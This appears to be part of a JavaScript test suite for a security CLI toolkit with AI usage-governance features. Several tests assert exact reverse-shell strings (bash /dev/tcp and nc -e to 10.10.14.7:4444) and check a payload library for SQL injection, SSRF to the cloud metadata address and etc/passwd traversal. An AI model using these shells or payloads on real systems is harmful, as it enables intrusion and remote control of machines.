  eq("incidr yes", CMD_MAP.incidr.run({ rest: ["10.0.0.5", "10.0.0.0/24"], c: plain }), "  yes — 10.0.0.5 is inside 10.0.0.0/24");
  eq("incidr no", CMD_MAP.incidr.run({ rest: ["10.0.9.9", "10.0.0.0/24"], c: plain }), "  no — 10.0.9.9 is NOT inside 10.0.0.0/24");
  ok("entropy usage on empty", CMD_MAP.entropy.run({ rest: [], c: plain }).includes("usage: sentinel entropy"));
  eq("port number lookup (plain)", CMD_MAP.port.run({ rest: ["3306"], c: plain }), "  3306  mysql");
  ok("port name lookup returns multi-line joined string", (() => { const s = CMD_MAP.port.run({ rest: ["http"], c: plain }); return s.split("\n").length >= 4 && s.includes("80") && s.includes("443"); })());
  ok("url returns a multi-line block ending in a blank line", (() => { const s = CMD_MAP.url.run({ rest: ["https://h.com:8443/p?a=1"], c: plain }); return s.endsWith("\n") && s.includes("scheme") && s.includes("8443") && s.includes("query params:"); })());
  ok("url usage on empty", CMD_MAP.url.run({ rest: [], c: plain }).includes("usage: sentinel url"));
  ok("useragent + ua alias resolve to one entry", CMD_MAP.ua === CMD_MAP.useragent);
  ok("useragent parses a Chrome UA", (() => { const s = CMD_MAP.useragent.run({ rest: ["Mozilla/5.0 (Windows NT 10.0) Chrome/120.0 Safari/537.36"], c: plain }); return s.includes("Chrome 120.0") && s.includes("Windows 10/11") && s.endsWith("\n"); })());
  ok("cidr computes a /30", (() => { const s = CMD_MAP.cidr.run({ rest: ["10.0.0.0/30"], c: plain }); return s.includes("Network") && s.includes("Hosts") && s.includes("2"); })());
  ok("cidr usage on garbage", CMD_MAP.cidr.run({ rest: ["nope"], c: plain }).includes("usage: sentinel cidr"));
  ok("epoch + time + ts aliases share one entry", CMD_MAP.time === CMD_MAP.epoch && CMD_MAP.ts === CMD_MAP.epoch);
  ok("epoch converts a fixed unix ts deterministically", (() => { const s = CMD_MAP.epoch.run({ rest: ["1700000000"], c: plain }); return s.includes("2023-11-14T22:13:20") && s.includes("epoch (ms)  1700000000000"); })());
  {
    const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
    const mk = (h, p) => b64(h) + "." + b64(p) + ".sig";
    const valid = mk({ alg: "HS256", typ: "JWT" }, { sub: "1", exp: 9999999999 });
    const expired = mk({ alg: "HS256", typ: "JWT" }, { sub: "2", exp: 1000000000 });
    const none = mk({ alg: "none", typ: "JWT" }, { sub: "3" });
    ok("jwt VALID state for far-future exp", CMD_MAP.jwt.run({ rest: [valid], c: plain }).includes("status: VALID"));
    ok("jwt EXPIRED state for past exp", CMD_MAP.jwt.run({ rest: [expired], c: plain }).includes("status: EXPIRED"));
    ok("jwt flags alg=none", CMD_MAP.jwt.run({ rest: [none], c: plain }).includes("warning: alg=none"));
    ok("jwt rejects non-JWT with usage", CMD_MAP.jwt.run({ rest: ["not-a-jwt"], c: plain }).includes("not a valid JWT"));
  }
  eq("revshell bash exact", CMD_MAP.revshell.run({ rest: ["bash", "10.10.14.7", "4444"], c: plain }), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
  ok("revshell defaults (no args) -> bash/10.0.0.1/4444", CMD_MAP.revshell.run({ rest: [], c: plain }) === "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
  ok("revshell unknown lang falls back to bash", CMD_MAP.revshell.run({ rest: ["zzz", "1.2.3.4", "9001"], c: plain }).startsWith("bash -i"));
  eq("status 404 (plain)", CMD_MAP.status.run({ rest: ["404"], c: plain }), "404 Not Found  · 4xx client error");
  ok("status unknown code -> usage", CMD_MAP.status.run({ rest: ["999"], c: plain }).includes("unknown status code"));
  ok("dorks builds a block per dork + h1", (() => { const s = CMD_MAP.dorks.run({ rest: ["example.com"], c: plain }); return s.includes("Google dorks for example.com") && s.includes("google.com/search?q=") && s.includes(encodeURIComponent("site:example.com")); })());
  ok("dorks usage on empty", CMD_MAP.dorks.run({ rest: [], c: plain }).includes("usage: sentinel dorks"));
  ok("cheats no-arg lists topics", CMD_MAP.cheats.run({ rest: [], c: plain }).startsWith("topics: "));
  ok("cheats topic returns its lines", (() => { const s = CMD_MAP.cheats.run({ rest: ["nmap"], c: plain }); return s.includes("nmap") && !s.startsWith("topics:"); })());
  ok("cheats unknown topic falls back to topic list", CMD_MAP.cheats.run({ rest: ["zzz"], c: plain }).startsWith("topics: "));
  eq("encode b64", CMD_MAP.encode.run({ rest: ["b64", "Hello World!"], c: plain }), "SGVsbG8gV29ybGQh");
  eq("decode b64 roundtrips", CMD_MAP.decode.run({ rest: ["b64", "SGVsbG8gV29ybGQh"], c: plain }), "Hello World!");
  eq("encode hex", CMD_MAP.encode.run({ rest: ["hex", "Hello"], c: plain }), "48656c6c6f");
  eq("unknown type message", CMD_MAP.encode.run({ rest: ["zzz", "x"], c: plain }), "unknown type (b64|hex|url|base32)");
  eq("decode base32 invalid message", CMD_MAP.decode.run({ rest: ["base32", "!!!"], c: plain }), "(invalid base32)");
  ok("uuid returns a v4 UUID", /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(CMD_MAP.uuid.run({ rest: [], c: plain })));
  ok("passphrase default shape = 4 words + bits label", /^  \S+(-\S+){3}  \(~32 bits\)$/.test(CMD_MAP.passphrase.run({ rest: [], c: plain })));
  ok("passphrase honors count arg (6 words, 48 bits)", /^  \S+(-\S+){5}  \(~48 bits\)$/.test(CMD_MAP.passphrase.run({ rest: ["6"], c: plain })));
  ok("passphrase non-numeric arg -> default 4 words", /(-\S+){3}  \(~32 bits\)$/.test(CMD_MAP.passphrase.run({ rest: ["abc"], c: plain })));
  // registry commands must NOT also have a leftover 'cmd === ' branch (no double dispatch)
  const src = fs.readFileSync(path.join(__dirname, "..", "sentinel.js"), "utf8");
  const doubled = CMDS.flatMap((cmd) => [cmd.name, ...(cmd.aliases || [])]).filter((n) => src.includes('cmd === "' + n + '"'));
  eq("no migrated command still dispatched inline", doubled, []);
}

group("no dead lib imports in sentinel.js");
{
  const src = fs.readFileSync(path.join(__dirname, "..", "sentinel.js"), "utf8");
  const imported = new Set();
  for (const m of src.matchAll(/const \{([^}]*)\} = require\("\.\/lib\/[^"]+"\)/g))
    m[1].split(",").forEach((n) => { n = n.trim().split(":").pop().trim(); if (n) imported.add(n); });
  const dead = [...imported].filter((n) => {
    const re = new RegExp("\\b" + n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "\\b", "g");
    return (src.match(re) || []).length === 1; // only the import itself
  });
  eq("every destructured lib import is used", dead, []);
}

group("encoders (shared CLI + menu)");
{
  const { ENC } = require("../lib/toolkit/encoders");
  eq("op keys present", Object.keys(ENC).sort(), ["b64d", "b64e", "base32d", "base32e", "hexd", "hexe", "urld", "urle"]);
  ok("b64/hex/url/base32 all roundtrip", ["b64", "hex", "url", "base32"].every((t) => ENC[t + "d"](ENC[t + "e"]("Sentinel 42!")) === "Sentinel 42!"));
  eq("url encodes a space", ENC.urle("a b"), "a%20b");
  eq("invalid base32 -> guarded message", ENC.base32d("!!!"), "(invalid base32)");
}

group("tech-debt scanner (/todo)");
{
  const { scanText, summarizeTodos, rankTodos, scanTree, TAGS } = require("../lib/nexus/todos");
  const src = ["a=1 // TODO: wire it", "// FIXME broken", "ok()", "  # HACK: temp", "plain", "// NOTE - test later", "let TODOLIST=[] // no marker"].join("\n");
  const items = scanText(src, "a.js");
  eq("finds the four real markers in order of appearance", items.map((i) => i.tag), ["TODO", "FIXME", "HACK", "NOTE"]);
  ok("captures file + line + text", items[0].file === "a.js" && items[0].line === 1 && items[0].text === "wire it");
  ok("word-boundary excludes TODOLIST", !items.some((i) => i.text.includes("no marker")));
  eq("summarize", summarizeTodos(items), { total: 4, byTag: { TODO: 1, FIXME: 1, HACK: 1, NOTE: 1 }, files: 1 });
  eq("rank by severity (FIXME>HACK>TODO>NOTE)", rankTodos(items).map((i) => i.tag), ["FIXME", "HACK", "TODO", "NOTE"]);
  ok("TAGS covers common markers", ["TODO", "FIXME", "HACK", "BUG"].every((t) => TAGS.includes(t)));
  // scanTree over a temp project: skips node_modules, reads source
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-todo-"));
  fs.writeFileSync(path.join(d, "x.js"), "// TODO: alpha\nfn()\n// BUG: beta\n");
  fs.mkdirSync(path.join(d, "node_modules")); fs.writeFileSync(path.join(d, "node_modules", "dep.js"), "// TODO: should be ignored\n");
  fs.writeFileSync(path.join(d, "notes.txt"), "// TODO: non-source ignored\n");
  const { items: tree, files } = scanTree(d);
  ok("scanTree reads source, skips node_modules + non-code", tree.length === 2 && files === 1 && tree.every((i) => i.file === "x.js"));
  ok("scanTree respects maxItems", scanTree(d, { maxItems: 1 }).items.length === 1);
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("env-var audit (/env)");
{
  const { scanEnvRefs, parseEnvFile, auditEnv, readEnvFiles, scanEnvTree, COMMON } = require("../lib/nexus/envaudit");
  const src = 'const a=process.env.API_KEY; const b=process.env["DB_URL"]; if(process.env.NODE_ENV==="p"){} const p=process.env.PORT;';
  eq("scanEnvRefs finds all forms", scanEnvRefs(src).sort(), ["API_KEY", "DB_URL", "NODE_ENV", "PORT"]);
  eq("parseEnvFile honors export + skips comments", parseEnvFile("# c\nexport API_KEY=abc\nDB_URL=x\nSTALE=1\n\n"), ["API_KEY", "DB_URL", "STALE"]);
  const a = auditEnv({ used: scanEnvRefs(src), declared: ["API_KEY", "DB_URL", "STALE"] });
  eq("undocumented excludes common runtime vars (NODE_ENV/PORT)", a.undocumented, []);
  eq("unused = declared but never referenced", a.unused, ["STALE"]);
  ok("undocumented surfaces a real gap", auditEnv({ used: ["SECRET_TOKEN"], declared: [] }).undocumented.length === 1);
  ok("ignoreCommon:false includes NODE_ENV/PORT", auditEnv({ used: scanEnvRefs(src), declared: [], ignoreCommon: false }).undocumented.includes("NODE_ENV"));
  ok("COMMON has the usual runtime vars", COMMON.has("NODE_ENV") && COMMON.has("PORT"));
  // tree + template walk
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-env-"));
  fs.writeFileSync(path.join(d, "app.js"), 'process.env.API_KEY; process.env.MISSING_ONE;');
  fs.writeFileSync(path.join(d, ".env.example"), "API_KEY=\nOLD_KEY=\n");
  const used = scanEnvTree(d).used, envf = readEnvFiles(d);
  const at = auditEnv({ used, declared: envf.declared });
  ok("end-to-end: MISSING_ONE undocumented, OLD_KEY unused", at.undocumented.includes("MISSING_ONE") && at.unused.includes("OLD_KEY") && envf.files.includes(".env.example"));
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("dependency hygiene (/deps)");
{
  const { packageName, parseImports, auditDeps, isBuiltin, scanImports } = require("../lib/nexus/deps");
  eq("packageName strips subpaths + scopes; null for relative/builtin", [packageName("lodash/fp"), packageName("@babel/core/lib"), packageName("./x"), packageName("fs")], ["lodash", "@babel/core", null, null]);
  ok("isBuiltin handles node: prefix", isBuiltin("fs") && isBuiltin("node:path") && !isBuiltin("express"));
  const src = 'const fs=require("fs"); import x from "express"; import {a} from "@scope/pkg"; const y=require("./local"); import("chalk"); export {z} from "zod/lib";';
  const specs = parseImports(src);
  ok("parseImports covers require/import/dynamic/export-from", ["fs", "express", "@scope/pkg", "./local", "chalk", "zod/lib"].every((s) => specs.includes(s)));
  const a = auditDeps({ pkg: { dependencies: { express: "^4", unusedpkg: "^1" }, devDependencies: { jest: "^29" } }, specifiers: specs });
  eq("unused = declared minus imported", a.unused, ["jest", "unusedpkg"]);
  eq("missing = imported minus declared (builtins/relative excluded)", a.missing, ["@scope/pkg", "chalk", "zod"]);
  ok("clean project reports no unused/missing", (() => { const c = auditDeps({ pkg: { dependencies: { express: "^4" } }, specifiers: ["express", "fs", "./x"] }); return !c.unused.length && !c.missing.length; })());
  // scanImports over a temp project
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-deps-"));
  fs.writeFileSync(path.join(d, "a.js"), 'require("chalk"); const p=require("path");');
  fs.mkdirSync(path.join(d, "node_modules")); fs.writeFileSync(path.join(d, "node_modules", "dep.js"), 'require("should-be-ignored");');
  const found = scanImports(d);
  ok("scanImports collects source specifiers, skips node_modules", found.includes("chalk") && found.includes("path") && !found.includes("should-be-ignored"));
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("codebase stats (/stats)");
{
  const { langOf, summarizeStats, rankedLangs, scanStats } = require("../lib/nexus/codestats");
  ok("langOf maps extensions (case-insensitive), unknown -> null", langOf("a.ts") === "TypeScript" && langOf("X.PY") === "Python" && langOf("Makefile") === null);
  const e = [
    { file: "a.js", lines: 100, bytes: 2000, lang: "JavaScript" },
    { file: "b.js", lines: 50, bytes: 900, lang: "JavaScript" },
    { file: "c.py", lines: 200, bytes: 5000, lang: "Python" },
    { file: "readme", lines: 0, bytes: 0, lang: null },
  ];
  const s = summarizeStats(e);
  eq("totals ignore unrecognized files", [s.totalFiles, s.totalLines, s.totalBytes], [3, 350, 7900]);
  ok("byLang aggregates per language", s.byLang.JavaScript.files === 2 && s.byLang.JavaScript.lines === 150 && s.byLang.Python.lines === 200);
  eq("rankedLangs by lines desc", rankedLangs(s).map((l) => l[0]), ["Python", "JavaScript"]);
  eq("largest files by line count", s.largest.map((f) => f.file), ["c.py", "a.js", "b.js"]);
  // scanTree over a temp project: counts source, skips node_modules + non-code
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-stats-"));
  fs.writeFileSync(path.join(d, "app.js"), "a\nb\nc\n");
  fs.writeFileSync(path.join(d, "svc.py"), "x\ny\n");
  fs.mkdirSync(path.join(d, "node_modules")); fs.writeFileSync(path.join(d, "node_modules", "dep.js"), "ignored\n");
  fs.writeFileSync(path.join(d, "data.bin"), "not source");
  const st = summarizeStats(scanStats(d));
  ok("scanStats reads source, skips node_modules + non-code", st.totalFiles === 2 && st.byLang.JavaScript.files === 1 && st.byLang.Python.files === 1);
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("hashing + password gen");
{
  const { ALGOS, GENPASS_CHARS, digests, genPass } = require("../lib/toolkit/hashing");
  const m = Object.fromEntries(digests("abc"));
  eq("algo order", ALGOS, ["md5", "sha1", "sha256", "sha512"]);
  eq("md5('abc') vector", m.md5, "900150983cd24fb0d6963f7d28e17f72");
  eq("sha256('abc') vector", m.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  ok("digests returns [algo, hex] pairs for every algo", digests("x").length === 4 && digests("x").every((r) => r.length === 2 && /^[0-9a-f]+$/.test(r[1])));
  ok("genPass clamps length to [8,128]", genPass("1").length === 8 && genPass("999").length === 128 && genPass("").length === 20 && genPass("abc").length === 20);
  // deterministic with injected rng: bytes = [0,1,2,...] -> chars[0], chars[1], ...
  const fakeRng = (n) => Buffer.from(Array.from({ length: n }, (_, i) => i));
  eq("genPass deterministic with injected rng", genPass(10, fakeRng), GENPASS_CHARS.slice(0, 10));
  ok("genPass only uses the declared charset", genPass(128, fakeRng).split("").every((ch) => GENPASS_CHARS.includes(ch)));
}

group("cheat-sheets");
{
  const { CHEATS, cheatTopics } = require("../lib/toolkit/cheats");
  eq("expected topics present", cheatTopics().sort(), ["cracking", "nmap", "privesc", "shells", "transfer", "web", "windows"]);
  ok("every topic has a non-empty string-array", cheatTopics().every((t) => Array.isArray(CHEATS[t]) && CHEATS[t].length > 0 && CHEATS[t].every((l) => typeof l === "string" && l.length)));
  ok("nmap cheats mention nmap", CHEATS.nmap.every((l) => l.includes("nmap")));
  ok("privesc includes the SUID find", CHEATS.privesc.some((l) => l.includes("-perm -4000")));
}

group("payload library");
{
  const { PAYLOADS_CLI, payloadClasses } = require("../lib/toolkit/payloads");
  eq("expected classes present", payloadClasses().sort(), ["cmdi", "lfi", "sqli", "ssrf", "ssti", "xss"]);
  ok("every class has a non-empty string array", payloadClasses().every((c) => Array.isArray(PAYLOADS_CLI[c]) && PAYLOADS_CLI[c].length > 0 && PAYLOADS_CLI[c].every((p) => typeof p === "string" && p.length)));
  ok("sqli includes the canonical tautology", PAYLOADS_CLI.sqli.includes("' OR '1'='1"));
  ok("ssrf includes the cloud metadata endpoint", PAYLOADS_CLI.ssrf.some((p) => p.includes("169.254.169.254")));
  ok("lfi includes an etc/passwd traversal", PAYLOADS_CLI.lfi.some((p) => p.includes("etc/passwd")));
}

group("google dork builder");
{
  const { DORK_BASE, DORKS, dorkUrls } = require("../lib/toolkit/dorks");
  ok("catalog non-empty [label, query] pairs", DORKS.length >= 5 && DORKS.every((d) => d.length === 2 && d[0] && d[1]));
  const rows = dorkUrls("example.com");
  ok("one row per dork", rows.length === DORKS.length);
  eq("first row encodes site: query", rows[0], { label: "exposed files", query: 'intitle:"index of"', encoded: encodeURIComponent('site:example.com intitle:"index of"'), url: DORK_BASE + encodeURIComponent('site:example.com intitle:"index of"') });
  ok("every url = base + encoded", rows.every((r) => r.url === DORK_BASE + r.encoded));
  ok("domain is URL-encoded into the query", dorkUrls("a b.com")[0].encoded.includes(encodeURIComponent("site:a b.com ")));
  ok("empty domain does not throw", dorkUrls("").length === DORKS.length && dorkUrls(null).length === DORKS.length);
}

group("http status reference");
{
  const { HTTP_STATUS_MAP, statusClass, statusInfo } = require("../lib/toolkit/httpstatus");
  ok("map covers common codes", HTTP_STATUS_MAP["200"] === "OK" && HTTP_STATUS_MAP["404"] === "Not Found" && HTTP_STATUS_MAP["503"] === "Service Unavailable");
  eq("statusInfo 200", statusInfo("200"), { code: "200", text: "OK", class: "2xx success" });
  eq("statusInfo 418", statusInfo(418), { code: "418", text: "I'm a teapot", class: "4xx client error" });
  eq("statusInfo trims whitespace", statusInfo("  404 "), { code: "404", text: "Not Found", class: "4xx client error" });
  ok("statusInfo unknown/empty → null", statusInfo("999") === null && statusInfo("") === null && statusInfo("abc") === null && statusInfo(null) === null);
  ok("statusClass boundaries", statusClass(199) === "1xx informational" && statusClass(200) === "2xx success" && statusClass(399) === "3xx redirect" && statusClass(500) === "5xx server error" && statusClass(600) === "");
}

group("reverse-shell payloads");
{
  const { SHELLS, revshell, shellLangs } = require("../lib/toolkit/revshell");
  ok("langs present", shellLangs().length >= 7 && shellLangs().includes("bash") && shellLangs().includes("powershell"));
  eq("bash exact", revshell("bash", "10.10.14.7", "4444"), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
  eq("nc exact", revshell("nc", "10.10.14.7", "4444"), "nc -e /bin/sh 10.10.14.7 4444");
  ok("ip + port interpolated into every payload", shellLangs().every((l) => { const s = revshell(l, "1.2.3.4", "9001"); return s.includes("1.2.3.4") && s.includes("9001"); }));
  ok("unknown lang falls back to bash", revshell("nope", "5.6.7.8", "1234") === revshell("bash", "5.6.7.8", "1234"));
  ok("SHELLS entries are builder functions", Object.values(SHELLS).every((f) => typeof f === "function"));
}

group("help reference (single source of truth)");
{
  const { COMMAND_GROUPS, documentedVerbs, renderCommands } = require("../lib/cli/reference");
  ok("8 command groups, non-empty", COMMAND_GROUPS.length === 8 && COMMAND_GROUPS.every((g) => g.title && g.rows.length));
  ok("every row is [left, right] strings", COMMAND_GROUPS.every((g) => g.rows.every((r) => r.length === 2 && typeof r[0] === "string" && typeof r[1] === "string")));
  // DRIFT GUARD: every documented command verb must have a real dispatch handler —
  // either an inline `cmd === "x"` branch or a lib/registry.js command entry.
  const src = fs.readFileSync(path.join(__dirname, "..", "sentinel.js"), "utf8");
  const dispatched = new Set();
  for (const m of src.matchAll(/cmd === "([^"]+)"/g)) dispatched.add(m[1]);
  const { CMDS: REG } = require("../lib/cli/registry");
  for (const cmd of REG) for (const n of [cmd.name, ...(cmd.aliases || [])]) dispatched.add(n);
  const undocumentedDrift = [...documentedVerbs()].filter((v) => !dispatched.has(v));
  eq("no documented command lacks a handler", undocumentedDrift, []);
  // renderer: column math + dynamic cheats substitution + title coloring
  const txt = renderCommands(COMMAND_GROUPS, { color: (s) => "[" + s + "]", cheats: "aa, bb" });
  ok("renderCommands colors titles", txt.includes("    [AI & Nexus]") && txt.includes("    [Reference]"));
  ok("renderCommands substitutes __CHEATS__", txt.includes("aa, bb") && !txt.includes("__CHEATS__"));
  ok("summary column aligned (>=2 spaces, min col 34)", renderCommands([{ title: "T", rows: [["scan <host>", "x"]] }]).endsWith("scan <host>".padEnd(34) + "x"));
  ok("long left cell keeps 2-space gap", renderCommands([{ title: "T", rows: [["encode <b64|hex|url|base32> <text>", "y"]] }]).endsWith("encode <b64|hex|url|base32> <text>  y"));
}

group("diceware passphrase");
{
  const { WORDS, genPassphrase, passphraseBits } = require("../lib/toolkit/passphrase");
  ok("wordlist non-trivial + unique + clean", WORDS.length >= 200 && new Set(WORDS).size === WORDS.length && WORDS.every((w) => /^[a-z]+$/.test(w)));
  // deterministic via injected rng: a fake that returns fixed indices
  const fake = (() => { let i = 0; const seq = [0, 1, 2, 3]; return () => seq[i++ % seq.length]; })();
  eq("genPassphrase deterministic with injected rng", genPassphrase(4, fake), [WORDS[0], WORDS[1], WORDS[2], WORDS[3]].join("-"));
  ok("word count honored", genPassphrase(6, () => 0).split("-").length === 6);
  ok("default is 4 words", genPassphrase(undefined, () => 0).split("-").length === 4);
  ok("all words come from the list", genPassphrase(8).split("-").every((w) => WORDS.includes(w)));
  ok("count clamped to sane bounds", genPassphrase(0, () => 0).split("-").length === 4 && genPassphrase(999, () => 0).split("-").length === 32);
  ok("entropy bits scale with words", passphraseBits(4) === Math.round(4 * Math.log2(WORDS.length)) && passphraseBits(6) > passphraseBits(4));
}

group("usage ledger + chargeback report");
{
  const { appendUsage, loadUsage, summarize, renderReport, MONEY, TOK } = require("../lib/governance/usage");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-usage-"));
  ok("appendUsage writes + loadUsage reads", (() => {
    appendUsage(dir, { ts: "2026-08-11T09:00:00Z", engine: "claude", model: "claude-opus-4-8", inTok: 1000, outTok: 500, cost: 0.04, seconds: 10, files: 2, commands: 1 });
    appendUsage(dir, { ts: "2026-08-12T10:00:00Z", engine: "ollama", model: "qwen2.5-coder", inTok: 4000, outTok: 2000, cost: 0, seconds: 30, files: 1, commands: 2, interrupted: true });
    return loadUsage(dir).length === 2;
  })());
  ok("loadUsage since-filter", loadUsage(dir, { since: "2026-08-12" }).length === 1);
  ok("malformed ledger lines are skipped", (() => { fs.appendFileSync(path.join(dir, ".nexus", "usage.jsonl"), "not json\n"); return loadUsage(dir).length === 2; })());
  const s = summarize(loadUsage(dir));
  eq("summarize totals", [s.turns, s.inTok, s.outTok, s.files, s.commands, s.interrupted], [2, 5000, 2500, 3, 3, 1]);
  ok("summarize cost", Math.round(s.cost * 1000) / 1000 === 0.04);
  ok("byEngine + byDay breakdowns", s.byEngine.claude.turns === 1 && s.byEngine.ollama.turns === 1 && Object.keys(s.byDay).length === 2);
  ok("first/last timestamps span the ledger", s.firstTs === "2026-08-11T09:00:00Z" && s.lastTs === "2026-08-12T10:00:00Z");
  ok("loadUsage on a dir with no ledger → []", loadUsage(fs.mkdtempSync(path.join(os.tmpdir(), "nexus-empty-"))).length === 0);
  const rep = renderReport(s, { project: "acme" });
  ok("report has header + cost + engine + day sections", /Nexus usage report — acme/.test(rep) && rep.includes("$0.0400") && rep.includes("claude") && rep.includes("By day"));
  eq("MONEY + TOK formatting", [MONEY(0.04), TOK(1500), TOK(2500000)], ["$0.0400", "1.5k", "2.50M"]);
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch (_) {}
}

group("operator/team attribution");
{
  const { resolveOperator } = require("../lib/governance/identity");
  const { summarize, renderReport } = require("../lib/governance/usage");
  // env (SSO-provisioned) wins
  eq("env identity wins", resolveOperator({ env: { SENTINEL_OPERATOR: "alice", SENTINEL_TEAM: "platform" }, cwd: os.tmpdir() }), { operator: "alice", team: "platform", source: "sso-env" });
  // local config fallback
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-id-")); fs.mkdirSync(path.join(d, ".nexus"));
  fs.writeFileSync(path.join(d, ".nexus", "identity.json"), JSON.stringify({ operator: "bob", team: "payments" }));
  eq("config identity when env is empty", resolveOperator({ env: {}, cwd: d }), { operator: "bob", team: "payments", source: "config" });
  ok("OS-user fallback never blank", (() => { const r = resolveOperator({ env: {}, cwd: os.tmpdir() }); return r.operator && r.source === "os"; })());
  // attribution rolls up per operator + team
  const recs = [
    { ts: "2026-08-12T09:00:00Z", engine: "claude", model: "opus", inTok: 100, outTok: 50, cost: 0.05, operator: "alice", team: "platform" },
    { ts: "2026-08-12T10:00:00Z", engine: "claude", model: "opus", inTok: 80, outTok: 40, cost: 0.03, operator: "bob", team: "payments" },
    { ts: "2026-08-12T11:00:00Z", engine: "ollama", model: "qwen", inTok: 500, outTok: 200, cost: 0, operator: "alice", team: "platform" },
  ];
  const s = summarize(recs);
  ok("byOperator rollup", s.byOperator.alice.turns === 2 && Math.round(s.byOperator.alice.cost * 100) / 100 === 0.05 && s.byOperator.bob.turns === 1);
  ok("byTeam rollup", s.byTeam.platform.turns === 2 && s.byTeam.payments.turns === 1);
  ok("report shows team + operator sections when multiple", (() => { const r = renderReport(s, { project: "x" }); return r.includes("By team") && r.includes("By operator") && r.includes("alice") && r.includes("payments"); })());
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("compliance bundle (SOC2 export)");
{
  const { buildBundle, verifyBundle, renderBundleMd, sha256 } = require("../lib/governance/compliance");
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-comp-")); fs.mkdirSync(path.join(d, ".nexus"));
  fs.writeFileSync(path.join(d, ".nexus", "usage.jsonl"), JSON.stringify({ ts: "2026-08-12T10:00:00Z", engine: "claude", model: "opus", inTok: 100, outTok: 50, cost: 0.02, operator: "alice", team: "platform" }) + "\n");
  fs.writeFileSync(path.join(d, ".nexus", "policy.json"), JSON.stringify({ protectedPaths: [".env"], audit: true }));
  const b = buildBundle(d, { operator: "alice", team: "platform", now: "2026-08-12T12:00:00Z", signingKey: "secret" });
  eq("bundle metadata", [b.kind, b.version, b.generatedAt, b.operator, b.team], ["sentinel.compliance.bundle", 1, "2026-08-12T12:00:00Z", "alice", "platform"]);
  ok("bundle carries usage + manifest digests", b.usage.turns === 1 && b.manifest["usage.jsonl"].sha256.length === 64 && b.manifest["policy.json"]);
  ok("integrity + signature present", b.integrity.algo === "sha256" && b.integrity.hash.length === 64 && b.signature.algo === "hmac-sha256");
  eq("verify a good signed bundle", verifyBundle(b, "secret"), { hashOk: true, sigOk: true });
  ok("wrong key fails signature but hash still ok", (() => { const v = verifyBundle(b, "nope"); return v.hashOk === true && v.sigOk === false; })());
  ok("tampering breaks integrity + signature", (() => { const t = JSON.parse(JSON.stringify(b)); t.usage.cost = 999; const v = verifyBundle(t, "secret"); return v.hashOk === false && v.sigOk === false; })());
  ok("unsigned bundle: sigOk is null", (() => { const u = buildBundle(d, { operator: "alice", now: "2026-08-12T12:00:00Z" }); return u.signature === undefined && verifyBundle(u).sigOk === null && verifyBundle(u).hashOk === true; })());
  ok("markdown render has the key sections", (() => { const md = renderBundleMd(b); return md.includes("# Sentinel compliance report") && md.includes("Operator:** alice") && md.includes("Manifest (SHA-256)") && md.includes(b.integrity.hash); })());
  ok("deterministic with fixed now + injected key", buildBundle(d, { operator: "alice", team: "platform", now: "2026-08-12T12:00:00Z", signingKey: "secret" }).integrity.hash === b.integrity.hash);
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

console.log("\n" + (fail ? "\x1b[31m" : "\x1b[32m") + pass + " passed, " + fail + " failed\x1b[0m");
process.exit(fail ? 1 : 0);
